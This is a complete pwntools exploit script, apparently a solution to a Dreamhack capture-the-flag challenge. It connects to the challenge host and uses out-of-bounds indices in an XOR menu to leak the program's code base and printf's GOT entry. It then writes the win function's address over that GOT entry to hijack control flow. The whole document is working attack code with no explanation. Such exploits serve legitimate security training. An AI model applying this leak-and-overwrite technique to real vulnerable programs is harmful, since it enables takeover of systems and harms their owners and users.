from pwn import *

context.log_level = 'debug'

e = ELF('./main')
# p = e.process()
p = remote('host1.dreamhack.games', 13357)

def xor(ij):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', ij)

def print_arr(i):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', i)
    p.recvuntil(b'Value: ')
    return int(p.recvline(), 16)
    
def binary_magic(target, storage):
    for i in range(48):
        if target & (1 << i):
            ij = str(storage).encode() + b' ' + str(i).encode()
            xor(ij)

# Leak Code base & win
xor(b'0 -57')
code_base = print_arr(b'0') - 0x3411
win = code_base + e.sym.win
xor(b'0 -57')

# Leak printf's GOT
xor(b'0 -16')
printf_got = print_arr(b'0') - 1
xor(b'0 -16')

# Set arr[63] to win's address
xor(b'63 63')
binary_magic(win, 63)
binary_magic(printf_got, 63)

xor(b'-16 63')

p.interactive()
